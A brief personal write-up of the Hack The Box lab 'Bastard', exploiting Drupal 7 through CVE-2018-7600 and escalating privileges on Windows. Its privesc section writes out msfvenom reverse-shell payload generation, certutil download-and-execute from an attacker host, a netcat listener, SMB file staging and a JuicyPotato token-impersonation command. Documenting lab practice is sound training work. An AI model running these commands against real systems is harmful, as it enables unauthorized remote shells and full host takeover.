# Enumeration 

## open ports


### Port 80

![[Pasted image 20230119073954.png]]

![[Pasted image 20230119074115.png]]
[CVE-2018-7600](https://www.exploit-db.com/exploits/44449)

![[Pasted image 20230119080608.png]]

![[Pasted image 20230119080625.png]]


# Privesc 
shell is super slow so generating new one using msfvenom and executing it

On Attacker:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.19 LPORT=9003 -f exe -o reverse.exe
```

On Target:

```
certutil -urlcache -f http://10.10.16.19/reverse.exe rev.exe
.\rev.exe
```

![[Pasted image 20230119081024.png]]


![[Pasted image 20230119080844.png]]

Another potato


On attacker:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.19 LPORT=9004 -f exe -o rev2.exe
nc -lvnp 9004
smbserver.py share .
```
{4991d34b-80a1-4291-83b6-3328366b9097}
On Target:
```
copy \\10.10.16.19\share\jp.exe
copy \\10.10.16.19\share\rev2.exe
.\jp.exe -t * -p .\rev3.exe -l 8002 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

![[Pasted image 20230119084557.png]]
![[Pasted image 20230119084609.png]]



---
Tags: #ctf #htb #potao #Token_impersonation #drupal_7 #CVE-2018-7600
Resources: [Bastard](https://app.hackthebox.com/machines/7) 